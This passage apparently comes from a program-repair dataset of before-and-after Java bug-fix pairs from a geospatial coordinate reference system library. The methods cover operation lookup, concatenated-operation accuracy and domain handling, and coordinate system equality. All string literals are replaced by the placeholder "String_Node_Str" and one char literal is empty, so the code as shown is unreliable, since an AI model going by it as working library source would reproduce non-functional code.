private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, ConversionException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Set<CoordinateOperation> operations;
  try {
    operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
    inverse=Containers.isNullOrEmpty(operations);
    if (inverse) {
      operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
      if (Containers.isNullOrEmpty(operations)) {
        return null;
      }
    }
  }
 catch (  NoSuchAuthorityCodeException|MissingFactoryResourceException exception) {
    log(exception);
    return null;
  }
  double largestArea=0;
  double finestAccuracy=Double.POSITIVE_INFINITY;
  CoordinateOperation bestChoice=null;
  boolean stopAtFirstDeprecated=false;
  for (final Iterator<CoordinateOperation> it=operations.iterator(); it.hasNext(); ) {
    CoordinateOperation candidate;
    try {
      try {
        candidate=it.next();
      }
 catch (      BackingStoreException exception) {
        throw exception.unwrapOrRethrow(FactoryException.class);
      }
      if (inverse)       try {
        candidate=inverse(candidate);
      }
 catch (      NoninvertibleTransformException exception) {
        Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationRegistry.class,""String_Node_Str"",exception);
        continue;
      }
    }
 catch (    MissingFactoryResourceException e) {
      log(e);
      continue;
    }
    if (candidate != null) {
      final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
      if (isDeprecated && stopAtFirstDeprecated) {
        break;
      }
      final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
      if (bestChoice == null || area >= largestArea) {
        final double accuracy=CRS.getLinearAccuracy(candidate);
        if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
          candidate=complete(candidate,sourceCRS,targetCRS);
          if (filter == null || filter.test(candidate)) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
  }
  return bestChoice;
}","/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null} if no such operation is explicitly defined in the underlying database.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws ConversionException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, ConversionException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Set<CoordinateOperation> operations;
  try {
    operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
    inverse=Containers.isNullOrEmpty(operations);
    if (inverse) {
      operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
      if (Containers.isNullOrEmpty(operations)) {
        return null;
      }
    }
  }
 catch (  NoSuchAuthorityCodeException|MissingFactoryResourceException exception) {
    log(exception);
    return null;
  }
  double largestArea=0;
  double finestAccuracy=Double.POSITIVE_INFINITY;
  CoordinateOperation bestChoice=null;
  boolean stopAtFirstDeprecated=false;
  for (final Iterator<CoordinateOperation> it=operations.iterator(); it.hasNext(); ) {
    CoordinateOperation candidate;
    try {
      candidate=it.next();
    }
 catch (    BackingStoreException exception) {
      FactoryException cause=exception.unwrapOrRethrow(FactoryException.class);
      if (cause instanceof MissingFactoryResourceException) {
        log(cause);
        continue;
      }
      throw cause;
    }
    if (candidate != null) {
      final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
      if (isDeprecated && stopAtFirstDeprecated) {
        break;
      }
      final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
      if (bestChoice == null || area >= largestArea) {
        final double accuracy=CRS.getLinearAccuracy(candidate);
        if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
          if (inverse)           try {
            candidate=inverse(candidate);
          }
 catch (          NoninvertibleTransformException exception) {
            Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationRegistry.class,""String_Node_Str"",exception);
            continue;
          }
catch (          MissingFactoryResourceException e) {
            log(e);
            continue;
          }
          candidate=complete(candidate,sourceCRS,targetCRS);
          if (filter == null || filter.test(candidate)) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
  }
  return bestChoice;
}"
91885,"/** 
 * Prints the name and authority code (if any) of the given object.
 */
private void printNameAndIdentifier(final IdentifiedObject object){
  outHeader.append(object.getName().getCode());
  final String identifier=IdentifiedObjects.toString(IdentifiedObjects.getIdentifier(object,null));
  if (identifier != null) {
    outHeader.append(' ');
    if (colors) {
      outHeader.append(X364.FOREGROUND_CYAN.sequence());
    }
    outHeader.append('(');
    outHeader.append(identifier);
    outHeader.append(')');
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
  }
  outHeader.nextLine();
}","/** 
 * Prints the name and authority code (if any) of the given object.
 * @param object      the object for which to print name and identifier.
 * @param idRequired  {@code true} for printing the name only if an identifier is present.
 * @return whether this method has printed something.
 */
private boolean printNameAndIdentifier(final IdentifiedObject object,final boolean idRequired){
  final String identifier=IdentifiedObjects.toString(IdentifiedObjects.getIdentifier(object,null));
  if (idRequired && identifier == null) {
    return false;
  }
  outHeader.append(object.getName().getCode());
  if (identifier != null) {
    outHeader.append(' ');
    if (colors) {
      outHeader.append(X364.FOREGROUND_CYAN.sequence());
    }
    outHeader.append('(');
    outHeader.append(identifier);
    outHeader.append(')');
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
  }
  if (!idRequired) {
    outHeader.nextLine();
  }
  return true;
}"
91886,"/** 
 * Transforms coordinates from the files given in argument or from the standard input stream.
 */
@Override public int run() throws Exception {
  parseArguments();
  if (outputFormat == Format.XML) {
    final String format=outputFormat.name();
    throw new InvalidOptionException(Errors.format(Errors.Keys.IncompatibleFormat_2,""String_Node_Str"",format),format);
  }
  operation=CRS.findOperation(fetchCRS(Option.SOURCE_CRS),fetchCRS(Option.TARGET_CRS),null);
  outHeader=new TableAppender(new LineAppender(out),""String_Node_Str"");
  outHeader.setMultiLinesCells(true);
  printHeader(Vocabulary.Keys.Source);
  printNameAndIdentifier(operation.getSourceCRS());
  printHeader(Vocabulary.Keys.Destination);
  printNameAndIdentifier(operation.getTargetCRS());
  printHeader(Vocabulary.Keys.Methods);
  printOperationMethods(operation,false);
  outHeader.nextLine();
  if (options.containsKey(Option.VERBOSE)) {
    final WKTFormat f=new WKTFormat(locale,timezone);
    f.setConvention(options.containsKey(Option.DEBUG) ? Convention.INTERNAL : convention);
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    final CharSequence[] lines=CharSequences.splitOnEOL(f.format(operation.getMathTransform()));
    for (int i=0; i < lines.length; i++) {
      if (i == 0) {
        printHeader(Vocabulary.Keys.Details);
      }
 else {
        printCommentLinePrefix();
        outHeader.nextColumn();
      }
      outHeader.append(lines[i]);
      outHeader.nextLine();
    }
  }
  double accuracy=CRS.getLinearAccuracy(operation);
  if (accuracy >= 0) {
    if (accuracy == 0) {
      accuracy=Formulas.LINEAR_TOLERANCE;
    }
    printHeader(Vocabulary.Keys.Accuracy);
    if (colors) {
      outHeader.append(X364.FOREGROUND_YELLOW.sequence());
    }
    outHeader.append(Double.toString(accuracy));
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
    outHeader.append(""String_Node_Str"");
    outHeader.nextLine();
  }
  outHeader.flush();
  outHeader=null;
  final boolean useStandardInput=useStandardInput();
  if (useStandardInput || !files.isEmpty()) {
    computeDomainOfValidity();
    ordinateWidth=15;
    coordinateFormat=NumberFormat.getInstance(Locale.US);
    coordinateFormat.setGroupingUsed(false);
    computeNumFractionDigits(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    printAxes(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    if (useStandardInput) {
      try (LineNumberReader in=new LineNumberReader(new InputStreamReader(System.in,encoding))){
        transform(in,""String_Node_Str"");
      }
     }
 else {
      for (      final String file : files) {
        try (LineNumberReader in=new LineNumberReader(new InputStreamReader(new FileInputStream(file),encoding))){
          transform(in,file);
        }
       }
    }
  }
  return 0;
}","/** 
 * Transforms coordinates from the files given in argument or from the standard input stream.
 */
@Override public int run() throws Exception {
  parseArguments();
  if (outputFormat == Format.XML) {
    final String format=outputFormat.name();
    throw new InvalidOptionException(Errors.format(Errors.Keys.IncompatibleFormat_2,""String_Node_Str"",format),format);
  }
  operation=CRS.findOperation(fetchCRS(Option.SOURCE_CRS),fetchCRS(Option.TARGET_CRS),null);
  outHeader=new TableAppender(new LineAppender(out),""String_Node_Str"");
  outHeader.setMultiLinesCells(true);
  printHeader(Vocabulary.Keys.Source);
  printNameAndIdentifier(operation.getSourceCRS(),false);
  printHeader(Vocabulary.Keys.Destination);
  printNameAndIdentifier(operation.getTargetCRS(),false);
  printHeader(Vocabulary.Keys.Operations);
  printOperations(operation,false);
  outHeader.nextLine();
  if (options.containsKey(Option.VERBOSE)) {
    final WKTFormat f=new WKTFormat(locale,timezone);
    f.setConvention(options.containsKey(Option.DEBUG) ? Convention.INTERNAL : convention);
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    final CharSequence[] lines=CharSequences.splitOnEOL(f.format(operation.getMathTransform()));
    for (int i=0; i < lines.length; i++) {
      if (i == 0) {
        printHeader(Vocabulary.Keys.Details);
      }
 else {
        printCommentLinePrefix();
        outHeader.nextColumn();
      }
      outHeader.append(lines[i]);
      outHeader.nextLine();
    }
  }
  double accuracy=CRS.getLinearAccuracy(operation);
  if (accuracy >= 0) {
    if (accuracy == 0) {
      accuracy=Formulas.LINEAR_TOLERANCE;
    }
    printHeader(Vocabulary.Keys.Accuracy);
    if (colors) {
      outHeader.append(X364.FOREGROUND_YELLOW.sequence());
    }
    outHeader.append(Double.toString(accuracy));
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
    outHeader.append(""String_Node_Str"");
    outHeader.nextLine();
  }
  outHeader.flush();
  outHeader=null;
  final boolean useStandardInput=useStandardInput();
  if (useStandardInput || !files.isEmpty()) {
    computeDomainOfValidity();
    ordinateWidth=15;
    coordinateFormat=NumberFormat.getInstance(Locale.US);
    coordinateFormat.setGroupingUsed(false);
    computeNumFractionDigits(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    printAxes(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    if (useStandardInput) {
      try (LineNumberReader in=new LineNumberReader(new InputStreamReader(System.in,encoding))){
        transform(in,""String_Node_Str"");
      }
     }
 else {
      for (      final String file : files) {
        try (LineNumberReader in=new LineNumberReader(new InputStreamReader(new FileInputStream(file),encoding))){
          transform(in,file);
        }
       }
    }
  }
  return 0;
}"
91887,"/** 
 * Returns the identified object for the specified value, creating it if needed.
 * @throws BackingStoreException if the object creation failed.
 * @see #createObject(String)
 */
final T get(final String code) throws BackingStoreException {
  T object;
  boolean success;
synchronized (objects) {
    object=objects.get(code);
    success=(object != null || !objects.containsKey(code));
  }
  if (!success) {
    try {
      object=createObject(code);
      success=true;
    }
 catch (    FactoryException exception) {
      if (!isRecoverableFailure(exception)) {
        throw new BackingStoreException(exception);
      }
      final LogRecord record=Messages.getResources(null).getLogRecord(Level.WARNING,Messages.Keys.CanNotInstantiateForIdentifier_3,type,code,getCause(exception));
      record.setLoggerName(Loggers.CRS_FACTORY);
      Logging.log(IdentifiedObjectSet.class,""String_Node_Str"",record);
    }
synchronized (objects) {
      if (success) {
        if (objects.containsKey(code)) {
          final T c=objects.putIfAbsent(code,object);
          if (c != null) {
            object=c;
          }
 else {
            codes=null;
          }
        }
      }
 else       if (objects.remove(code,null)) {
        codes=null;
      }
    }
  }
  return object;
}","/** 
 * Returns the identified object for the specified value, creating it if needed.
 * @throws BackingStoreException if the object creation failed.
 * @see #createObject(String)
 */
final T get(final String code) throws BackingStoreException {
  T object;
  boolean success;
synchronized (objects) {
    object=objects.get(code);
    success=(object != null || !objects.containsKey(code));
  }
  if (!success) {
    try {
      object=createObject(code);
      success=true;
    }
 catch (    FactoryException exception) {
      if (!isRecoverableFailure(exception)) {
        throw new BackingStoreException(exception);
      }
      final LogRecord record=Messages.getResources(getLocale()).getLogRecord(Level.WARNING,Messages.Keys.CanNotInstantiateForIdentifier_3,type,code,getCause(exception));
      record.setLoggerName(Loggers.CRS_FACTORY);
      Logging.log(IdentifiedObjectSet.class,""String_Node_Str"",record);
    }
synchronized (objects) {
      if (success) {
        if (objects.containsKey(code)) {
          final T c=objects.putIfAbsent(code,object);
          if (c != null) {
            object=c;
          }
 else {
            codes=null;
          }
        }
      }
 else       if (objects.remove(code,null)) {
        codes=null;
      }
    }
  }
  return object;
}"
91888,"/** 
 * Creates operations from source and target coordinate reference system codes. This method only extract the information explicitely declared in the EPSG database; it does not attempt to infer by itself operations that are not explicitely recorded in the database. <p>The returned set is ordered with the most accurate operations first.</p>
 * @param sourceCRS  Coded value of source coordinate reference system.
 * @param targetCRS  Coded value of target coordinate reference system.
 * @return The operations from {@code sourceCRS} to {@code targetCRS}.
 * @throws NoSuchAuthorityCodeException if a specified code was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 */
@Override public synchronized Set<CoordinateOperation> createFromCoordinateReferenceSystemCodes(final String sourceCRS,final String targetCRS) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  final String label=sourceCRS + ""String_Node_Str"" + targetCRS;
  final CoordinateOperationSet set=new CoordinateOperationSet(owner);
  try {
    final int[] pair=toPrimaryKeys(null,null,null,sourceCRS,targetCRS);
    boolean searchTransformations=false;
    do {
      final String key, sql;
      if (searchTransformations) {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
      }
 else {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"";
      }
      final Integer targetKey=searchTransformations ? null : pair[1];
      try (ResultSet result=executeQuery(key,sql,pair)){
        while (result.next()) {
          set.addAuthorityCode(getString(label,result,1),targetKey);
        }
      }
     }
 while ((searchTransformations=!searchTransformations) == true);
    final String[] codes=set.getAuthorityCodes();
    if (codes.length > 1 && sort(""String_Node_Str"",codes)) {
      set.setAuthorityCodes(codes);
    }
  }
 catch (  SQLException exception) {
    throw databaseFailure(CoordinateOperation.class,label,exception);
  }
  set.resolve(1);
  return set;
}","/** 
 * Creates operations from source and target coordinate reference system codes. This method only extract the information explicitely declared in the EPSG database; it does not attempt to infer by itself operations that are not explicitely recorded in the database. <p>The returned set is ordered with the most accurate operations first. Deprecated operations are not included in the set; if a deprecated operation is really wanted, it can be fetched by an explicit call to   {@link #createCoordinateOperation(String)}.</p>
 * @param sourceCRS  Coded value of source coordinate reference system.
 * @param targetCRS  Coded value of target coordinate reference system.
 * @return The operations from {@code sourceCRS} to {@code targetCRS}.
 * @throws NoSuchAuthorityCodeException if a specified code was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 */
@Override public synchronized Set<CoordinateOperation> createFromCoordinateReferenceSystemCodes(final String sourceCRS,final String targetCRS) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  final String label=sourceCRS + ""String_Node_Str"" + targetCRS;
  final CoordinateOperationSet set=new CoordinateOperationSet(owner);
  try {
    final int[] pair=toPrimaryKeys(null,null,null,sourceCRS,targetCRS);
    boolean searchTransformations=false;
    do {
      final String key, sql;
      if (searchTransformations) {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
      }
 else {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"";
      }
      final Integer targetKey=searchTransformations ? null : pair[1];
      try (ResultSet result=executeQuery(key,sql,pair)){
        while (result.next()) {
          set.addAuthorityCode(getString(label,result,1),targetKey);
        }
      }
     }
 while ((searchTransformations=!searchTransformations) == true);
    final String[] codes=set.getAuthorityCodes();
    if (codes.length > 1 && sort(""String_Node_Str"",codes)) {
      set.setAuthorityCodes(codes);
    }
  }
 catch (  SQLException exception) {
    throw databaseFailure(CoordinateOperation.class,label,exception);
  }
  set.resolve(1);
  return set;
}"
91889,"/** 
 * Invoked by JAXB for setting the operations.
 */
private void setSteps(final CoordinateOperation[] steps) throws FactoryException {
  final List<CoordinateOperation> flattened=new ArrayList<>(steps.length);
  initialize(null,steps,flattened,DefaultFactories.forBuildin(MathTransformFactory.class),coordinateOperationAccuracy == null);
  operations=UnmodifiableArrayList.wrap(flattened.toArray(new CoordinateOperation[flattened.size()]));
}","/** 
 * Invoked by JAXB for setting the operations.
 */
private void setSteps(final CoordinateOperation[] steps) throws FactoryException {
  final List<CoordinateOperation> flattened=new ArrayList<>(steps.length);
  initialize(null,steps,flattened,DefaultFactories.forBuildin(MathTransformFactory.class),(coordinateOperationAccuracy == null),(domainOfValidity == null));
  operations=UnmodifiableArrayList.wrap(flattened.toArray(new CoordinateOperation[flattened.size()]));
}"
91890,"/** 
 * Performs the part of   {@code DefaultConcatenatedOperations} construction that requires an iteration overthe sequence of coordinate operations. This method performs the following processing: <ul> <li>Verify the validity of the  {@code operations} argument.</li><li>Add the single operations in the  {@code flattened} array.</li><li>Set the  {@link #transform} field to the concatenated transform.</li><li>Set the  {@link #coordinateOperationAccuracy} field, but only if {@code setAccuracy} is {@code true}.</li> </ul> This method invokes itself recursively if there is nested   {@code ConcatenatedOperation} instancesin the given list. This should not happen according ISO 19111 standard, but we try to be safe. <div class=""section"">How coordinate operation accuracy is determined</div> If  {@code setAccuracy} is {@code true}, then this method copies accuracy information found in the single  {@link Transformation} instance. This method ignores instances of other kinds for the following reason:some  {@link Conversion} instances declare an accuracy, which is typically close to zero. If a concatenatedoperation contains such conversion together with a transformation with unknown accuracy, then we do not want to declare ""0 meter"" as the concatenated operation accuracy; it would be a false information. An other reason is that a concatenated operation typically contains an arbitrary amount of conversions, but only one transformation. So considering only transformations usually means to pickup only one operation in the given  {@code operations} list, which make things clearer.<div class=""note""><b>Note:</b> according ISO 19111, the accuracy attribute is allowed only for transformations. However this restriction is not enforced everywhere. For example the EPSG database declares an accuracy of 0 meter for conversions, which is conceptually exact. In this class we are departing from strict interpretation of the specification since we are adding accuracy informations to a concatenated operation. This departure should be considered as a convenience feature only; accuracies are really relevant in transformations only.</div>
 * @param properties  The properties specified at construction time, or {@code null} if unknown.
 * @param operations  The operations to concatenate.
 * @param flattened   The destination list in which to add the {@code SingleOperation} instances.
 * @param mtFactory   The math transform factory to use, or {@code null} for not performing concatenation.
 * @param setAccuracy {@code true} for setting the {@link #coordinateOperationAccuracy} field.
 * @throws FactoryException if the factory can not concatenate the math transforms.
 */
private void initialize(final Map<String,?> properties,final CoordinateOperation[] operations,final List<CoordinateOperation> flattened,final MathTransformFactory mtFactory,boolean setAccuracy) throws FactoryException {
  CoordinateReferenceSystem previous=null;
  for (int i=0; i < operations.length; i++) {
    final CoordinateOperation op=operations[i];
    ArgumentChecks.ensureNonNullElement(""String_Node_Str"",i,op);
    if (previous != null) {
      final CoordinateReferenceSystem next=op.getSourceCRS();
      if (next != null) {
        final int dim1=previous.getCoordinateSystem().getDimension();
        final int dim2=next.getCoordinateSystem().getDimension();
        if (dim1 != dim2) {
          throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.MismatchedDimension_3,""String_Node_Str"" + i + ""String_Node_Str"",dim1,dim2));
        }
      }
    }
    previous=op.getTargetCRS();
    MathTransform step=op.getMathTransform();
    if (op instanceof ConcatenatedOperation) {
      final List<? extends CoordinateOperation> children=((ConcatenatedOperation)op).getOperations();
      @SuppressWarnings(""String_Node_Str"") final CoordinateOperation[] asArray=children.toArray(new CoordinateOperation[children.size()]);
      initialize(properties,asArray,flattened,(step == null) ? mtFactory : null,setAccuracy);
    }
 else {
      flattened.add(op);
    }
    if (mtFactory != null) {
      transform=(transform != null) ? mtFactory.createConcatenatedTransform(transform,step) : step;
    }
    if (setAccuracy && (op instanceof Transformation || op instanceof ConcatenatedOperation)) {
      if (coordinateOperationAccuracy == null) {
        setAccuracy=(PositionalAccuracyConstant.getLinearAccuracy(op) > 0);
        if (setAccuracy) {
          coordinateOperationAccuracy=op.getCoordinateOperationAccuracy();
        }
      }
 else {
        coordinateOperationAccuracy=null;
        setAccuracy=false;
      }
    }
  }
}","/** 
 * Performs the part of   {@code DefaultConcatenatedOperations} construction that requires an iteration overthe sequence of coordinate operations. This method performs the following processing: <ul> <li>Verify the validity of the  {@code operations} argument.</li><li>Add the single operations in the  {@code flattened} array.</li><li>Set the  {@link #transform} field to the concatenated transform.</li><li>Set the  {@link #coordinateOperationAccuracy} field, but only if {@code setAccuracy} is {@code true}.</li> </ul> This method invokes itself recursively if there is nested   {@code ConcatenatedOperation} instancesin the given list. This should not happen according ISO 19111 standard, but we try to be safe. <div class=""section"">How coordinate operation accuracy is determined</div> If  {@code setAccuracy} is {@code true}, then this method copies accuracy information found in the single  {@link Transformation} instance. This method ignores instances of other kinds for the following reason:some  {@link Conversion} instances declare an accuracy, which is typically close to zero. If a concatenatedoperation contains such conversion together with a transformation with unknown accuracy, then we do not want to declare ""0 meter"" as the concatenated operation accuracy; it would be a false information. An other reason is that a concatenated operation typically contains an arbitrary amount of conversions, but only one transformation. So considering only transformations usually means to pickup only one operation in the given  {@code operations} list, which make things clearer.<div class=""note""><b>Note:</b> according ISO 19111, the accuracy attribute is allowed only for transformations. However this restriction is not enforced everywhere. For example the EPSG database declares an accuracy of 0 meter for conversions, which is conceptually exact. In this class we are departing from strict interpretation of the specification since we are adding accuracy informations to a concatenated operation. This departure should be considered as a convenience feature only; accuracies are really relevant in transformations only.</div>
 * @param properties  The properties specified at construction time, or {@code null} if unknown.
 * @param operations  The operations to concatenate.
 * @param flattened   The destination list in which to add the {@code SingleOperation} instances.
 * @param mtFactory   The math transform factory to use, or {@code null} for not performing concatenation.
 * @param setAccuracy {@code true} for setting the {@link #coordinateOperationAccuracy} field.
 * @param setDomain   {@code true} for setting the {@link #domainOfValidity} field.
 * @throws FactoryException if the factory can not concatenate the math transforms.
 */
private void initialize(final Map<String,?> properties,final CoordinateOperation[] operations,final List<CoordinateOperation> flattened,final MathTransformFactory mtFactory,boolean setAccuracy,boolean setDomain) throws FactoryException {
  CoordinateReferenceSystem previous=null;
  for (int i=0; i < operations.length; i++) {
    final CoordinateOperation op=operations[i];
    ArgumentChecks.ensureNonNullElement(""String_Node_Str"",i,op);
    if (previous != null) {
      final CoordinateReferenceSystem next=op.getSourceCRS();
      if (next != null) {
        final int dim1=previous.getCoordinateSystem().getDimension();
        final int dim2=next.getCoordinateSystem().getDimension();
        if (dim1 != dim2) {
          throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.MismatchedDimension_3,""String_Node_Str"" + i + ""String_Node_Str"",dim1,dim2));
        }
      }
    }
    previous=op.getTargetCRS();
    MathTransform step=op.getMathTransform();
    if (op instanceof ConcatenatedOperation) {
      final List<? extends CoordinateOperation> children=((ConcatenatedOperation)op).getOperations();
      @SuppressWarnings(""String_Node_Str"") final CoordinateOperation[] asArray=children.toArray(new CoordinateOperation[children.size()]);
      initialize(properties,asArray,flattened,(step == null) ? mtFactory : null,setAccuracy,setDomain);
    }
 else {
      flattened.add(op);
    }
    if (mtFactory != null) {
      transform=(transform != null) ? mtFactory.createConcatenatedTransform(transform,step) : step;
    }
    if (setAccuracy && (op instanceof Transformation || op instanceof ConcatenatedOperation) && (PositionalAccuracyConstant.getLinearAccuracy(op) != 0)) {
      if (coordinateOperationAccuracy == null) {
        coordinateOperationAccuracy=op.getCoordinateOperationAccuracy();
      }
 else {
        coordinateOperationAccuracy=null;
        setAccuracy=false;
      }
    }
    if (setDomain) {
      final Extent domain=op.getDomainOfValidity();
      if (domain != null) {
        if (domainOfValidity == null) {
          domainOfValidity=domain;
        }
 else         if (!domain.equals(domainOfValidity)) {
          domainOfValidity=null;
          setDomain=false;
        }
      }
    }
  }
}"
91891,"/** 
 * This feature type is considered to all other features except itself.
 */
@Override public boolean isAssignableFrom(final DefaultFeatureType type){
  return false;
}","/** 
 * This feature type is considered independent of all other feature types except itself.
 */
@Override public boolean isAssignableFrom(final DefaultFeatureType type){
  return false;
}"
91892,"/** 
 * Compares the specified object with this coordinate system for equality.
 * @param object The object to compare to {@code this}.
 * @param mode {@link ComparisonMode#STRICT STRICT} for performing a strict comparison, or{@link ComparisonMode#IGNORE_METADATA IGNORE_METADATA} for comparing only propertiesrelevant to coordinate transformations.
 * @return {@code true} if both objects are equal.
 */
@Override public boolean equals(final Object object,final ComparisonMode mode){
  if (object == this) {
    return true;
  }
  if (!super.equals(object,mode)) {
    return false;
  }
switch (mode) {
case STRICT:
{
      return Arrays.equals(axes,((AbstractCS)object).axes);
    }
default :
{
    final CoordinateSystem that=(CoordinateSystem)object;
    final int dimension=getDimension();
    if (dimension != that.getDimension()) {
      return false;
    }
    if (mode != ComparisonMode.ALLOW_VARIANT) {
      for (int i=0; i < dimension; i++) {
        if (!deepEquals(getAxis(i),that.getAxis(i),mode)) {
          return false;
        }
      }
    }
    return true;
  }
}
}","/** 
 * Compares the specified object with this coordinate system for equality.
 * @param object The object to compare to {@code this}.
 * @param mode {@link ComparisonMode#STRICT STRICT} for performing a strict comparison, or{@link ComparisonMode#IGNORE_METADATA IGNORE_METADATA} for comparing only propertiesrelevant to coordinate transformations.
 * @return {@code true} if both objects are equal.
 */
@Override @SuppressWarnings(""String_Node_Str"") public boolean equals(final Object object,final ComparisonMode mode){
  if (object == this) {
    return true;
  }
  if (!super.equals(object,mode)) {
    return false;
  }
switch (mode) {
case STRICT:
{
      return Arrays.equals(axes,((AbstractCS)object).axes);
    }
case DEBUG:
{
    final int d1=axes.length;
    final int d2=((CoordinateSystem)object).getDimension();
    if (d1 != d2) {
      throw new AssertionError(Errors.format(Errors.Keys.MismatchedDimension_2,d1,d2));
    }
  }
default :
{
  final CoordinateSystem that=(CoordinateSystem)object;
  final int dimension=getDimension();
  if (dimension != that.getDimension()) {
    return false;
  }
  if (mode != ComparisonMode.ALLOW_VARIANT) {
    for (int i=0; i < dimension; i++) {
      if (!deepEquals(getAxis(i),that.getAxis(i),mode)) {
        return false;
      }
    }
  }
  return true;
}
}
}"
91893,"/** 
 * Returns the hash code value.
 */
@Override public int hashCode(){
  return sourceCRS.hashCode() * 31 + targetCRS.hashCode();
}","/** 
 * Returns the hash code value.
 */
@Override public int hashCode(){
  return Objects.hashCode(sourceCRS) * 31 + Objects.hashCode(targetCRS);
}"
91894,"/** 
 * Returns the name of the GeoAPI interface implemented by the specified object, followed by the name between brackets.
 */
static String label(final IdentifiedObject object){
  if (object == null) {
    return null;
  }
  Class<? extends IdentifiedObject> type;
  if (object instanceof AbstractIdentifiedObject) {
    type=((AbstractIdentifiedObject)object).getInterface();
  }
 else {
    type=Classes.getLeafInterfaces(object.getClass(),IdentifiedObject.class)[0];
  }
  String label=Classes.getShortName(type);
  String name=IdentifiedObjects.getName(object,null);
  if (name != null) {
    int i=30;
    if (name.length() >= i) {
      while (i > 15) {
        final int c=name.codePointBefore(i);
        if (Character.isSpaceChar(c))         break;
        i-=Character.charCount(c);
      }
      name=CharSequences.trimWhitespaces(name,0,i).toString() + '';
    }
    label=label + ""String_Node_Str"" + name+ ""String_Node_Str"";
  }
  return label;
}","/** 
 * Returns the name of the GeoAPI interface implemented by the specified object. In the GeographicCRS or EllipsoidalCS cases, the trailing CRS or CS suffix is replaced by the number of dimensions (e.g. ""Geographic3D"").
 */
static String label(final IdentifiedObject object){
  if (object == null) {
    return null;
  }
  Class<? extends IdentifiedObject> type;
  if (object instanceof AbstractIdentifiedObject) {
    type=((AbstractIdentifiedObject)object).getInterface();
  }
 else {
    type=Classes.getLeafInterfaces(object.getClass(),IdentifiedObject.class)[0];
  }
  String suffix, label=Classes.getShortName(type);
  if (label.endsWith((suffix=""String_Node_Str"")) || label.endsWith(suffix=""String_Node_Str"")) {
    Object cs=object;
